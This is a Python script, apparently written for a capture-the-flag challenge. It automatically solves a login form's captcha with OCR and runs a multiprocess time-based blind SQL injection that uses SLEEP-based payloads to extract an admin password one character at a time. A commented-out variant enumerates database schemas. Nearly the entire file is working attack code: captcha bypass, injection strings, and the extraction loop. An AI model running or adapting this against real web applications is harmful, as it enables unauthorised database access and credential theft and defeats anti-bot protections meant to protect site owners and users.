#!/usr/bin/python2.7
import itertools
import requests
import string
import sys
import re
import shutil
import pytesseract
import cv2
import os
import multiprocessing
from multiprocessing import Queue, Process, current_process, Event
#Queue FIFO
#4 process
nb_process = 4


try:
    import Image, ImageOps, ImageEnhance, imread
except ImportError:
    from PIL import Image, ImageOps, ImageEnhance


def compare(stra, strb):
    cpt = 0
    if len(stra) == len(strb):
        for x,y in zip(stra,strb):
            if x==y:
                cpt +=1
        if len(stra) == cpt:
            return 1
        else:
            return 0
    else:
        return 0

def solve_captcha(path):
    """
    Convert a captcha image into a text, 
    using PyTesseract Python-wrapper for Tesseract
    Arguments:
        path (str):
            path to the image to be processed
    Return:
        'textualized' image
    """
    image = Image.open(path).convert('RGB')
    image = ImageOps.autocontrast(image)
 
    filename = "{}.png".format(os.getpid())
    image.save(filename)
 
    text = pytesseract.image_to_string(Image.open(filename))
    return text

def captcha_func(dn, captcha_png):
    verif = ""
    captcha_text = ""
    r = requests.get(dn)
    status = 0
    m = re.search('<img\ssrc=(.*)>', r.text)
    b = re.search('Le code:\s(.*)\.', r.text)
    verif = b.group(1)
    site_image = m.group(1)
    uri = dn + site_image
    cookie = r.cookies.values()[0]
    header = { "Cookie": "PHPSESSID="+cookie }
    r = requests.get(uri, headers=header)
    with open(captcha_png, "wb") as f:
        for chunk in r:
            f.write(chunk)
    f.close()
    image = cv2.imread(captcha_png, 0)
    invert = cv2.bitwise_not(image)
    cv2.imwrite('invert_'+captcha_png, invert)
    captcha_text = solve_captcha('invert_'+captcha_png)
    status = compare(verif, captcha_text.split('\n')[0])
    with open("verif.txt", "a+") as g:
        g.write(verif + " " + captcha_text.split('\n')[0] + " " + str(status) + "\n")
    g.close()
    #if verif == captcha_text.split('\n')[0]:
    #    print(captcha_png + ": " + verif + " " + captcha_text.split('\n')[0])
    os.remove(captcha_png)
    captcha_resp = captcha_text.split('\n')[0]
    return captcha_resp, cookie



def brute(queue, event, dn, uri, alpha):
    proc_id = os.getpid()
    event.wait()
    print("test", multiprocessing.current_process().name)
    name_proc = str(multiprocessing.current_process().name)
    captcha_png = name_proc + '.png'
    header = {  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",  "Cache-Control": "no-cache", "Pragma": "no-cache"}
    print(captcha_png)
    for j in range(1,30):
        char = ""
        tmp = ""
        if queue.qsize() > 0:
            tmp = queue.get()
        print(multiprocessing.current_process().name + " : " + tmp + " : " + uri)
        if tmp != "":
            char = tmp
        for i in itertools.product(alpha):
            if i[0] != '%' and i[0] !='_':
                    #brute="\' UNION select 1,schema_name from information_schema.schemata where NOT schema_name='information_schema' AND NOT schema_name='performance_schema' AND NOT schema_name='mysql' AND schema_name LIKE BINARY \'" + char + str(pool) +"%\' AND SLEEP(2);--"
                    brute="4dm1n\' and p455w0rd LIKE BINARY \'" + char + str(i[0]) +"%\' AND SLEEP(2);--"
                    captcha_resp, cookie = captcha_func(dn, captcha_png)
                    #print("URI: " + uri)
                    header = {  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",  "Cache-Control": "no-cache", "Pragma": "no-cache", "Cookie": "PHPSESSID="+cookie}
                    #r = requests.post(uri, data={'username':brute, 'password':'test', 'captcha':captcha_resp}, proxies={'http':'http://127.0.0.1:8080'},headers=header )
                    r = requests.post(uri, data={'username':brute, 'password':'test', 'captcha':captcha_resp},headers=header )
                    #print(brute)
                    #print(r.url)
                    while "302" in str(r.history):
                        #print("try captcha")
                        captcha_resp, cookie = captcha_func(dn, captcha_png)
                        header = {  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",  "Cache-Control": "no-cache", "Pragma": "no-cache", "Cookie": "PHPSESSID="+cookie}
                        r = requests.post(uri, data={'username':brute, 'password':'test', 'captcha':captcha_resp}, headers=header)
                        #print(name_proc + ": " + str(r.history))
                        #print(name_proc + ": "+ brute)
                        #print(brute)
                        if "302" not in str(r.history):
                            #sys.stdout.flush()
                            #sys.stdout.write("\r"+brute)
                            print(brute)
                            print("It works")
                            break
                    if round(r.elapsed.total_seconds()) == 2:
                        char += str(i[0])
                        for z in range(nb_process*2):
                            queue.put(char)
                        sys.stdout.flush()
                        sys.stdout.write("\r"+brute)
                        break
            else:
                pass
    #brute=""
    #char=""
    #for j in xrange(1,30):
    #    for i in itertools.product(string.printable):
    #        for pool in i:
    #            brute="admin\' and password LIKE BINARY \'" + char + str(pool) +"%\' AND SLEEP(2);--"
                #r = requests.post(url, data={'username':brute, 'password':'test', 'bouton':'Bouton'}, proxies={"http":"http://127.0.0.1:8080"}, timeout=4)
    #            r = requests.post(url, data={'username':brute, 'password':'test', 'bouton':'Bouton'}, timeout=4)
    #            if round(r.elapsed.total_seconds()) == 2:
    #                char += pool
    #                sys.stdout.flush()
    #                sys.stdout.write("\r"+brute)
    #                break

def main():
    dn = "http://www.challenge.com/"
    url = dn + "inscription.php"
    urn = ""
    uri = url + urn
    e = Event()
    str_alphabet = string.printable
    len_alpha = int(len(str_alphabet)/nb_process)
    lst_alpha = []
    for i in range(nb_process):
        if i == 0:
            lst_alpha.append(str_alphabet[:len_alpha])
        elif i == (nb_process-1):
            lst_alpha.append(str_alphabet[(len_alpha*i)+1:])
        else:
            lst_alpha.append(str_alphabet[(len_alpha*i)+1:len_alpha*(i+1)])
    print(str(lst_alpha))
    queue = Queue()
    queue.put("")
    processes = [Process(target=brute, args=(queue, e, dn, uri, alpha, )) for _, alpha in zip(range(nb_process), lst_alpha)]
    print(processes)
    cpt = 0
    for p in processes:
        p.start()
        print("Compteur: " + str(cpt) + " process: " + str(p))
        cpt+=1
    e.set()


if __name__=="__main__":
    main()
